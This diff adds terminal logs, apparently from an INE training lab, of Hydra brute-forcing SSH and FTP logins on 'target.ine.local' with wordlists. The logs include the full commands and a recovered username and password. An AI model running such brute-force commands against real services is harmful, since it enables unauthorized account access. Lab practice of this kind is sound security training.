@@ -1,0 +1,27 @@
+ hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ssh://target.ine.local                                                             
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-03 03:20:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 8072 login tries (l:8/p:1009), ~505 tries per task
+[DATA] attacking ssh://target.ine.local:22/
+[STATUS] 133.00 tries/min, 133 tries in 00:01h, 7942 to do in 00:60h, 13 active
+[STATUS] 92.00 tries/min, 276 tries in 00:03h, 7799 to do in 01:25h, 13 active
+[STATUS] 85.86 tries/min, 601 tries in 00:07h, 7474 to do in 01:28h, 13 active
+[STATUS] 85.60 tries/min, 1284 tries in 00:15h, 6791 to do in 01:20h, 13 active
+[STATUS] 86.32 tries/min, 2676 tries in 00:31h, 5399 to do in 01:03h, 13 active
+[22][ssh] host: target.ine.local   login: alice   password: pretty
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+
+hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-03 03:16:37
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 8072 login tries (l:8/p:1009), ~505 tries per task
+[DATA] attacking ftp://target.ine.local:5554/
+[STATUS] 319.00 tries/min, 319 tries in 00:01h, 7753 to do in 00:25h, 16 active
+[STATUS] 293.33 tries/min, 880 tries in 00:03h, 7192 to do in 00:25h, 16 active
+[STATUS] 290.86 tries/min, 2036 tries in 00:07h, 6036 to do in 00:21h, 16 active
+[5554][ftp] host: target.ine.local   login: alice   password: pretty
+[STATUS] 354.00 tries/min, 5310 tries in 00:15h, 2762 to do in 00:08h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
